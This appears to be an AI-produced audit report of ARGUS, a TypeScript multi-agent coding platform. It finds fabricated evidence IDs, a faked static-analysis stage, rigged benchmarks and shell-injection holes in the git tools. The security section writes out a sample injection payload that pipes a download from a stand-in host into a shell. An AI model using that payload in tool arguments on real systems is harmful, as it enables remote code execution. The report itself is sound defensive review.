# ARGUS Codebase Audit Report

**Date:** 2026-09-03 · **Scope:** full read of `docs/prd.md`, every `src/`, `test/`, config and doc file in the monorepo · **Verification:** `pnpm build`, `pnpm test`, `pnpm test:e2e`, `pnpm lint`, `pnpm typecheck` executed against the working tree.

---

## 1. What the Project Does (Summary)

ARGUS is a TypeScript/pnpm-monorepo research platform for **autonomous, multi-agent software engineering**. Instead of one big LLM prompt, it decomposes repository work into specialized agents — an **Investigator** (explores the repo with git/search tools), a **Configuration Agent** (runs 10 deterministic "configuration debt" rules, CD001–CD105, over GitHub Actions YAML and Dockerfiles), a **Historian** (git log/blame intent analysis), an **Analyzer** (forms hypotheses classified as FACT/INFERENCE/HYPOTHESIS), a **Patch Agent** (produces unified diffs), and a **Verifier Agent** (applies the patch and runs `tsc` → ESLint → Vitest as a staged pipeline). An **Orchestrator** drives the loop (investigate → diagnose → patch → verify, max 3 patch attempts, 20 steps, 10-minute budget) and every message between agents is a Zod-validated `AgentEnvelope`. A CLI (`argus analyze | verify | config scan`), a GitHub Action entrypoint, a Docker-based sandbox, and a comparative benchmark harness (Baseline A/B vs. ARGUS) complete the intended system.

The central design claim — stated in the PRD, AGENTS.md, and README — is **reliability through grounding**: the LLM is never the source of truth; every finding must cite real `evidenceIds` produced by deterministic tool execution, and verification results must come from actual command exit codes in a fresh sandbox. The audit below shows that the _scaffolding_ for this exists and mostly works, but several of the load-bearing reliability mechanisms are missing, bypassed, or faked.

---

## 2. Verdict at a Glance

| Area                                          | State                  | Verdict                                                                    |
| --------------------------------------------- | ---------------------- | -------------------------------------------------------------------------- |
| `pnpm build` (20 pkgs)                        | ✅ 20/20 pass          | Compiles clean under strict TS                                             |
| `pnpm test` + `test:e2e`                      | ✅ 29/29 tasks pass    | But heavily mocked (see §4.6)                                              |
| `pnpm typecheck`                              | ✅ 37/37 pass          | Strict mode incl. `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes` |
| `pnpm lint`                                   | ❌ **Fails**           | `@argus/rules` lint script points to nonexistent `src/`                    |
| Canonical Zod schemas (`agent-core`)          | ✅ Correct             | Envelope, Finding, Evidence, RunState, VerificationResult all match PRD    |
| 10 deterministic debt rules (`rules/`)        | ✅ Correct             | All 10 implemented, deterministic, unit-tested                             |
| Config debt engine + `argus config scan`      | ✅ Works               | Real, deterministic, tested                                                |
| MCP tool registry + git/github tools          | ⚠️ Mostly works        | Real exec/fetch calls, but no MCP protocol, shell-injection risks          |
| Orchestrator state machine                    | ⚠️ Functional skeleton | Loop works; but fabricates evidence IDs, misroutes Historian payload       |
| Agents (6×)                                   | ⚠️ Real LLM calls      | Wired to Groq + tools; evidence layer never used                           |
| Verification pipeline                         | ❌ Unsafe / incomplete | Runs on host by default, never rolls back, static-analysis stage faked     |
| Benchmarks                                    | ❌ Fabricated          | ARGUS "evaluation" runs no agents; baseline scores clamped to lose         |
| Dashboard / `packages/analyzer` / `examples/` | ❌ Empty               | `.gitkeep` placeholders only                                               |
| GitHub Action / remote-repo analysis          | ❌ Broken              | `owner/repo` slug used as a local filesystem path                          |

**Overall: roughly 60–65% of the built surface is real and works. The remaining ~35–40% is exactly the reliability-critical core the project claims as its contribution** (grounded evidence, honest verification, honest benchmarks, MCP protocol, observability persistence).

---

## 3. What Is Correct (Genuinely Working)

1. **Canonical contracts (`packages/agent-core`)** — `AgentEnvelope`, `Finding`, `Evidence`, `Hypothesis`, `RunState`, `VerificationResult` Zod schemas match the PRD shapes, including `evidenceIds: min(1)`, epistemic enum, failure taxonomy (§19/§25 codes), and a proper `validateAgentEnvelope` runtime guard. Unit tests cover validation and rejection paths.
2. **All 10 debt rules (`rules/`)** — CD001–CD005 (GitHub Actions) and CD101–CD105 (Docker) are real, deterministic, line/AST-based implementations with rule IDs, severities, versions, evidence strings, and recommendations. Tests confirm detection _and_ clean-pass cases (e.g., SHA-pinned action → 0 findings).
3. **`ConfigDebtEngine` + `argus config scan`** — file-type detection, YAML AST parsing (with graceful fallback), recursive scan skipping `node_modules/.git/dist`. This is the most solid user-facing feature; it genuinely works end-to-end.
4. **MCP tool registry (`packages/mcp-server`)** — typed tools with semver strings, Zod input validation, permission levels, defensive error envelopes, duplicate-registration guard.
5. **Git/GitHub/CI tools** — real `git` subprocess calls and real `api.github.com` fetches with auth handling; `repo.read_file` has a path-traversal guard; write tools correctly refuse without `GITHUB_TOKEN` (tested).
6. **Orchestrator loop** — phased dispatch (investigate → config/history → analyze → patch/verify loop) with budget caps (20 steps / 3 patches / 3 verifications / 10 min), envelope validation on every agent reply, and error envelopes aborting the run. Unit tests prove the retry loop re-invokes Patch after failed verification.
7. **Docker sandbox (`packages/sandbox`)** — cross-platform Docker resolution, fresh named container per run, `docker cp` workspace injection, `git apply`/`patch` fallback, guaranteed `rm -f` cleanup. Sandbox lifecycle test passes when Docker is available.
8. **Secret redaction (`packages/trajectory`)** — `redactSecrets` covers `ghp_`/`gho_`/`xox`/Bearer/generic token patterns and is unit-tested.
9. **Repo hygiene basics** — `.env.local` is gitignored and _not_ committed (verified via `git ls-files`); conventional-commit history; no direct pushes to `main` evident.

---

## 4. What Is Wrong

### 4.1 Critical — the core reliability promise is broken

1. **The Evidence layer is never used — findings are grounded in _fabricated_ UUIDs.** No code anywhere constructs an `Evidence` object (`capturedAt` appears only in the schema definition). Agents are even prompted to return `"evidenceIds": []`. Worse, the Orchestrator's [`normalizeFinding`](file:///d:/Argus/packages/orchestrator/src/orchestrator.ts) **generates a random UUID when a finding has no evidence IDs** — the comment says "generate a synthetic evidence ID to satisfy the schema." This is exactly what AGENTS.md §3 forbids ("Never synthesize an Evidence record… an LLM assertion is not evidence") and it defeats the project's entire reason to exist: every `Finding.evidenceIds` in a real run points to evidence that does not exist.
2. **The static-analysis verification stage is faked.** [`runner.ts`](file:///d:/Argus/packages/verifier/src/runner.ts) returns `staticAnalysisPassed: lintPassed` in both host and sandbox paths. No `STATIC_ANALYSIS` stage is ever executed (the `runStaticAnalysis` option in [`types.ts`](file:///d:/Argus/packages/verifier/src/types.ts) is dead). Per the project's own rules, "a step marked passed without a command exit code is a critical bug" — here an entire _result field_ borrows another stage's outcome.
3. **Host-mode verification mutates the target repo and never rolls back.** `validateAndApplyPatch` runs `git apply` in the user's working tree with no `git apply -R`/stash revert. A failed verification leaves the repo dirty, and **patch attempt N+1 is applied on top of the still-applied attempt N**, compounding corruption. The default mode (`useSandbox: false` in [`verify.ts`](file:///d:/Argus/apps/cli/src/commands/verify.ts); [`agents/verifier`](file:///d:/Argus/agents/verifier/src/index.ts) never passes `useSandbox: true`) means `argus analyze` will modify your checkout. This contradicts README's claim that the Verifier runs "inside fresh Docker sandboxes" and §19/§32 fresh-container guarantees.
4. **Benchmarks are fabricated and rigged.** [`benchmarks/src/runner.ts`](file:///d:/Argus/benchmarks/src/runner.ts) imports `Orchestrator` **and never calls it** — the "ARGUS_MCP" score is just the deterministic rule engine matched against pre-declared expected rule IDs, with invented metrics (`toolCallCount = max(1, findings)`, `tokenUsageEstimate = max(500, findings*450)`, `patchSuccessRate = accuracy*0.7`). No agent, patch, or verification ever runs. Meanwhile [`baseline_a.ts`](file:///d:/Argus/benchmarks/src/baselines/baseline_a.ts) / [`baseline_b.ts`](file:///d:/Argus/benchmarks/src/baselines/baseline_b.ts) clamp LLM accuracy into `0.20–0.85` and `0.35–0.92` bands — and [`benchmark.test.ts`](file:///d:/Argus/benchmarks/test/benchmark.test.ts) then _asserts ARGUS beats Baseline A_, an assertion that is structurally guaranteed to pass. The dataset's commit hashes (e.g. `"1234567890abcdef…"` for express) are placeholders; PRD §26 demands 10–30 _real-world_ cases. As shipped, the evaluation cannot produce honest research results.

### 4.2 Functional bugs (real "not working properly" items)

5. **Historian always gets an empty file list.** The Orchestrator dispatches `{ relevantFiles: … }` (camelCase) but [`agents/historian/src/index.ts`](file:///d:/Argus/agents/historian/src/index.ts) reads `payload?.relevant_files` (snake_case). The Historian silently analyzes nothing, every run.
6. **`pnpm lint` fails monorepo-wide.** `rules/package.json` runs `eslint src/`, but `rules/` has no `src/` (rules live in `rules/github-actions/`, `rules/docker/`). ESLint exits 2 ("No files matching src/"), so the whole `turbo run lint` pipeline is red.
7. **`argus trace` command does not exist.** `bin.ts` advertises it in `--help` and PRD §23 requires `argus trace run_123`, but there is no `trace` branch in the command dispatcher — it falls through to "Unknown command". (A formatter exists and is used inline by `analyze`, but trajectories are never persisted, so there would be nothing to trace anyway.)
8. **Remote-repo analysis cannot work.** PRD/README document `argus analyze --repo owner/repo --pr 42`, but `repository` is used directly as `workspacePath` for `git`/`exec` calls. A GitHub slug is treated as a local directory → every tool fails. There is no clone/fetch step. The same bug breaks the **GitHub Action**, which passes `GITHUB_REPOSITORY` (`"owner/repo"`) straight into the Orchestrator. The Action also has no checkout step and never posts a review.
9. **LLM client retries non-retryable errors.** In [`llm-client.ts`](file:///d:/Argus/packages/shared/src/llm-client.ts), a 400/401/403 response `throw`s _inside_ the `try`, which is then caught by the method's own `catch` and retried with backoff — so hard auth failures burn 5 retries instead of failing fast. (429/413/5xx handling via `continue` is fine.)
10. **E2E test never exercises verification.** [`tests/e2e/full-pipeline.test.ts`](file:///d:/Argus/tests/e2e/full-pipeline.test.ts) mocks the Patch Agent to return `diff: ""`, which makes the Orchestrator `break` before any Verifier call — the riskiest stage of the pipeline has zero end-to-end coverage. All green tests run with fully mocked `fetch`.
11. **`VerifierAgent` hardcodes a 30 s timeout** for `tsc` + `eslint` + `vitest` (Orchestrator budget allows 10 min). On any cold or non-trivial repo the pipeline will time out and report failure.
12. **`repo.read_file` reports the truncated length as `size`** ([`repo-tools.ts`](file:///d:/Argus/packages/git/src/repo-tools.ts)): content is cut at 3000 chars, then `size: content.length` — the reported size is wrong for any file >3 KB.

### 4.3 Security issues

13. **Shell injection across git tools.** [`git.diff`](file:///d:/Argus/packages/git/src/tools-extended.ts) interpolates a **raw free-text `args` string** into the shell command — an LLM can pass `"; curl evil | sh"` and it executes. The same class of issue exists in `repo.search` / `repo.get_diff` / `git.show_commit` / `git.blame` / `git.log -- "…"`: quoting blocks spaces but **not `$(…)` or backticks**, which the shell still expands inside double quotes. These tools are executed precisely from untrusted LLM output, so this violates the §22 security model.
14. **Docker `exec` command escaping is host-shell-unsafe.** [`container.ts`](file:///d:/Argus/packages/sandbox/src/container.ts) escapes `"` but interpolates the command into a host shell string; `$(…)` in `lintCommand`/`testCommand` would run on the _host_, not in the container. The sandbox also has **no resource limits** (`--memory`/`--cpus`), no network isolation, and copies the _entire_ workspace (including `node_modules`, `.git`, `.turbo`) into the container per attempt — slow, and Windows-built native modules would be broken inside the Linux image.
15. **MCP adapter bypasses registry validation.** [`mcp-adapter.ts`](file:///d:/Argus/packages/shared/src/mcp-adapter.ts) calls `tool.execute(rawArgs)` directly, skipping the `inputSchema.safeParse` guard that `ToolRegistry.executeTool` provides — malformed LLM tool args flow straight into tool implementations.
16. **Inconsistent path-traversal protection.** `repo.read_file` guards against `../` escapes; `repo.get_dependencies` (and the config tools) do not.
17. **Live API key on disk.** `.env.local` contains a real Groq API key (`gsk_…ULWAP8Fi` — redacted here). It is gitignored (not committed), but it has now passed through an agent session — **rotate it**. Ironically, this is the exact pattern rule CD003 is designed to flag.

### 4.4 Hardcoded values inventory (as requested)

| Location                                      | Hardcoded value                                                                                                                                                                                          |
| --------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `shared/src/llm-client.ts`                    | Default model `"openai/gpt-oss-20b"` for **both** tiers, base URL `https://api.groq.com/openai/v1` — **README advertises `llama-3.3-70b-versatile` / `llama-3.1-8b-instant`, which the code never uses** |
| `git/src/repo-tools.ts`                       | File read truncated at **3000 chars**; file list capped at **40** with a hardcoded `.github/Dockerfile/*.yml/*.json` priority heuristic (30 + 10) that silently drops files                              |
| `shared/src/mcp-adapter.ts`                   | Tool output truncated at **4000 chars**; max **4** tool-loop iterations; history pruning at **12/6** messages                                                                                            |
| `agents/verifier/src/index.ts`                | Verification timeout **30 000 ms**                                                                                                                                                                       |
| `orchestrator/src/orchestrator.ts`            | Budgets **20 steps / 3 patches / 3 verifications / 10 min** (matches PRD §20 — fine, but fixed)                                                                                                          |
| `verifier/src/runner.ts`                      | Commands `npx tsc --noEmit`, `npx eslint . --max-warnings=0`, `npx vitest run`                                                                                                                           |
| `sandbox/src/container.ts`                    | Image `node:20-alpine`, 60 s default timeout                                                                                                                                                             |
| `rules/*`                                     | Thresholds: 25 steps/job, 10 jobs/workflow, 8 RUN layers, 20-char duplicate minimum                                                                                                                      |
| `benchmarks/src/*`                            | Token fallbacks **1200/2800**, ARGUS estimate formula `max(500, findings×450)`, accuracy clamps `0.20–0.85` (A) / `0.35–0.92` (B), fake commit hashes for famous repos                                   |
| `agents/patch/src/index.ts`                   | Fallback `filePath: "README.md"` when patch parsing fails                                                                                                                                                |
| `orchestrator` defaults in `normalizeFinding` | `confidence: 0.5`, `severity: "MEDIUM"`, `"Untitled finding"` placeholders injected into canonical state                                                                                                 |

### 4.5 Missing pieces vs. the PRD

- **No actual MCP protocol.** `packages/mcp-server` is an in-process TS registry — there is no `@modelcontextprotocol/sdk` dependency, no JSON-RPC/stdio transport. The "MCP-Native" claim is currently architectural aspiration; tools are plain function calls.
- **`ci.run_tests` / `ci.run_linter` (PRD §13) not implemented** — only `ci.list_workflows/get_runs/get_run/get_logs` exist.
- **`apps/dashboard/`, `packages/analyzer/`, `examples/`** — empty `.gitkeep` placeholders (PRD §25 dashboard, §28 layout).
- **No `.github/` workflows** — the repo has no CI of its own; **no `.husky` / lint-staged**, despite AGENTS.md §7 promising mechanical pre-commit gates.
- **ESLint config is toothless** — `eslint.config.mjs` uses only `eslint:recommended` with `no-unused-vars: off`; there is **no `@typescript-eslint` at all**, contradicting §21/AGENTS.md skill docs. (This is why the unused imports — `isDockerAvailable` in `runner.ts`, the GitHub PR tools and `RepoReadFileInputSchema` in the Investigator, `Orchestrator` in the benchmark runner — go unflagged.)
- **No trajectory persistence** — `TrajectoryLogger` is in-memory only; PRD §18/§31 require persisted, redacted run records. Additionally, the logger lives on the Orchestrator instance, so **reusing one Orchestrator leaks events from previous runs into the next run's trajectory**.
- **No GitHub write-back in the analyze flow** — the final "GitHub Review / Patch PR" step of the PRD architecture diagram is never invoked (write tools exist but are unused by agents/orchestrator).
- **Investigator can't use GitHub tools** — `GetPullRequestTool`, `GetPullRequestFilesTool`, `GetIssuesTool`, `GetCommentsTool` are imported but never added to its tool list (PRD §6.1 requires them).
- **Monorepo rule violated in tests** — `packages/config-engine/test/*` imports rules via `../../../rules/…` relative traversal; §33 mandates `@argus/*` workspace specifiers only.
- **Failure taxonomy unused at runtime** — the Orchestrator throws plain `Error`s for timeout/budget instead of classified `TIMEOUT` / `RESOURCE_LIMIT` envelope codes.
- **Doc drift** — `AGENTS.md` cites PRD §§31–35 and §34 (`ArgusAgent`), but `docs/prd.md` ends at §30; `handoff.md` marks every workstream "Merged/PR Ready" while three directories are empty and `pnpm lint` is red.

### 4.6 Why the tests all pass anyway

Build/typecheck genuinely pass. The test suite passes because: unit tests target the _deterministic_ islands (schemas, rules, registry, redaction); orchestrator tests use mock agents; CLI/benchmark/e2e tests stub `fetch` entirely; and the e2e mock returns an empty diff so verification never runs. Nothing in the suite exercises the real LLM + tools + sandbox path, which is precisely where the critical defects (§4.1) live.

---

## 5. Recommended Fix Order

1. Stop fabricating evidence: remove synthetic `evidenceIds` generation; mint real `Evidence` records in tool execution paths and require findings to reference them (or fail validation).
2. Make verification safe: default to the Docker sandbox; in host mode, snapshot and roll back (`git stash`/`git apply -R`) in a `finally`.
3. Implement the real `STATIC_ANALYSIS` stage or remove the field; stop aliasing it to lint.
4. Fix the Historian payload key (`relevant_files` ↔ `relevantFiles`) and the `argus trace` command; persist trajectories to disk.
5. Close shell-injection holes: replace string-interpolated `exec` with `execFile` + arg arrays; delete the free-text `git.diff` `args`.
6. Rebuild benchmarks honestly: run the real Orchestrator per case, remove accuracy clamps, use real repositories, record actual token/tool counts.
7. Repair hygiene: fix `rules` lint script, add `@typescript-eslint`, add Husky/lint-staged + a `.github` CI pipeline.
8. Either implement a real MCP server transport or drop "MCP-Native" from the docs; implement `ci.run_tests`/`ci.run_linter`; wire GitHub write tools into the final report step.
9. Rotate the Groq API key currently in `.env.local`.
